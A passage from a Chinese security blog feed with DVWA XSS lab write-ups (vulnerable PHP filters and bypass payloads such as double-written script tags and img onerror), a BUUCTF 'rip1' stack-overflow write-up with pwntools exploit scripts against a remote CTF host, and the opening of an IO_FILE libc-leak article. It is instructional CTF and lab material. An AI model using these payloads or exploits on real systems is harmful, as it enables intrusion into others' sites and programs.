class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>相关函数说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</span><br></pre></td></tr></table></figure>

<p>可以发现对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。</p>
<p>漏洞利用：</p>
<p>双写绕过，抓包改name参数为<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code>.成功得到弹窗。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213152350020.png" alt="image-20201213152350020"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213152417164.png" alt="image-20201213152417164"></p>
<ol start="3">
<li>high</li>
</ol>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看出，和medium比起来，这一次是使用正则表达式过滤了<code>&lt;script&gt;</code>，但是忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p>
<p>抓包将那么参数改为<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>,成功得到弹窗。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213163452272.png" alt="image-20201213163452272"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213163522302.png" alt="image-20201213163522302"></p>
<h3 id="XSS（Reflected）"><a href="#XSS（Reflected）" class="headerlink" title="XSS（Reflected）"></a>XSS（Reflected）</h3><ol>
<li><strong>安全级别low</strong></li>
</ol>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，是直接引用那么参数，没有任何过滤。</p>
<p>所以输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>就可以得到哦弹窗。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104830583.png" alt="image-20201213104830583"></p>
<ol start="2">
<li><strong>安全级别medium</strong></li>
</ol>
<p>服务器端的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>显然，这里利用基于黑名单的思想，将<code>&lt;script&gt;</code>删除。可以简单利用双写绕过。</p>
<p>输入<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code>就可以成功得到弹窗。 </p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213152657529.png" alt="image-20201213152657529"></p>
<ol start="3">
<li><strong>安全级别high</strong></li>
</ol>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> 	</span><br></pre></td></tr></table></figure>

<p>和存储型的xss一样，这里也是使用正则表达式过滤了<code>&lt;script&gt;</code>，可以使用img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
<p>输入<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>，成功得到弹窗。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213163829420.png" alt="image-20201213163829420"></p>
]]></content>
  </entry>
  <entry>
    <title>BUUCTF pwn基础题</title>
    <url>/posts/757fcf82/</url>
    <content><![CDATA[<h1 id="rip1"><a href="#rip1" class="headerlink" title="rip1"></a>rip1</h1><p>题目就是一个简单的栈溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1h] [rbp-Fh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(&amp;s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时也有后门函数。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210124231022387.png" alt="image-20210124231022387"></p>
<p>根据ida反编译的结果，payload应该是<code>&#39;a&#39;*23+p64(fun_addr)</code></p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26615</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">23</span>)+p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210124231126641.png" alt="image-20210124231126641"></p>
<p>其原因是栈没有对齐。具体参考<a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p>
<p>最终解决exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26615</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">23</span>)+p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里地址加一是为了栈平衡，绕过了<code>push ebp</code>这条指令。这样rsp不会加1，还是对齐的。</p>
]]></content>
      <tags>
        <tag>BUUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE泄露libc地址</title>
    <url>/posts/8601552c/</url>
    <content><![CDATA[<p>这两天做了两道没有输出函数，需要靠stdout来泄露libc的题，记录一下这种利用方式。</p>
<a id="more"></a>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="FILE简介"><a href="#FILE简介" class="headerlink" title="FILE简介"></a>FILE简介</h2><p>file的结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p <span class="built_in">stdout</span></span><br><span class="line">$<span class="number">1</span> = (struct _IO_FILE *) <span class="number">0x7ffff7dce760</span> &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; ptype <span class="built_in">stdout</span></span><br><span class="line">type = struct _IO_FILE &#123;</span><br><span class="line">    <span class="keyword">int</span> _flags;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_ptr;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_read_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_write_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_write_ptr;</span><br><span class="line">    <span class="keyword">char</span> *_IO_write_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_buf_end;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_backup_base;</span><br><span class="line">    <span class="keyword">char</span> *_IO_save_end;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">    <span class="keyword">int</span> _fileno;</span><br><span class="line">    <span class="keyword">int</span> _flags2;</span><br><span class="line">    <span class="keyword">__off_t</span> _old_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">    <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line">    <span class="keyword">__off64_t</span> _offset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line">    <span class="keyword">size_t</span> __pad5;</span><br><span class="line">    <span class="keyword">int</span> _mode;</span><br><span class="line">    <span class="keyword">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line">&#125; *</span><br></pre></td></tr></table></figure>

<p>这里面最重要的元素就是<code>_flags</code>和<code>_fileno</code>，<code>_fileno</code>存储的是我们的文件描述符，对于某些情况或许我们要劫持<code>_fileno</code>才能达到我们的目的，而<code>_flags</code>则标志了该<code>FILE</code>的一些行为，这对于我们的泄露至关重要。</p>
<p><code>_IO_2_1_stdout_</code>一般是这样的：</p>
<p><code>_IO_MAGIC|_IO_IS_FILEBUF|_IO_CURRENTLY_PUTTING|_IO_LINKED|_IO_NO_READS | _IO_UNBUFFERED |_IO_USER_BUF</code></p>
<h2 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h2><p>puts函数在源码中是由<code>_IO_puts</code>实现的。</p>
<p><strong>注：源码基于glbc 2.23</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (str)</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *str;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_cleanup_region_start ((<span class="keyword">void</span> (*) __P ((<span class="keyword">void</span> *))) _IO_funlockfile,</span><br><span class="line">			    _IO_stdout);</span><br><span class="line">  _IO_flockfile (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_stdout-&gt;_vtable_offset != <span class="number">0</span> || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = len + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  _IO_funlockfile (_IO_stdout);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> weak_alias</span></span><br><span class="line">weak_alias (_IO_puts, <span class="built_in">puts</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到，主要是调用了<code>_IO_sputn</code>，而这个_IO_sputn实际上就是一个宏，调用了<code>_IO_2_1_stdout_</code>的<code>vtable</code>中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (f, data, n)</span><br><span class="line">     _IO_FILE *f;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	  f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	  <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	  f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	  s += count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">int</span> i = (<span class="keyword">int</span>) count;</span><br><span class="line">	  <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">	    *p++ = *s++;</span><br><span class="line">	  f-&gt;_IO_write_ptr = p;</span><br><span class="line">	&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="keyword">return</span> n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.</span></span><br><span class="line"><span class="comment">	 dont_write is what gets left over. */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">        &#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个函数过程就是先判断缓冲区是否足够，然后刷新缓冲区。也就是调用<code>_IO_OVERFLOW</code>。</p>
<p>也就是下面的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (f, ch)</span><br><span class="line">      _IO_FILE *f;</span><br><span class="line">      <span class="keyword">int</span> ch;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span> </span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF+_IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_new_do_write(f, f-&gt;_IO_write_base,</span><br><span class="line">			    f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_new_do_write(f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      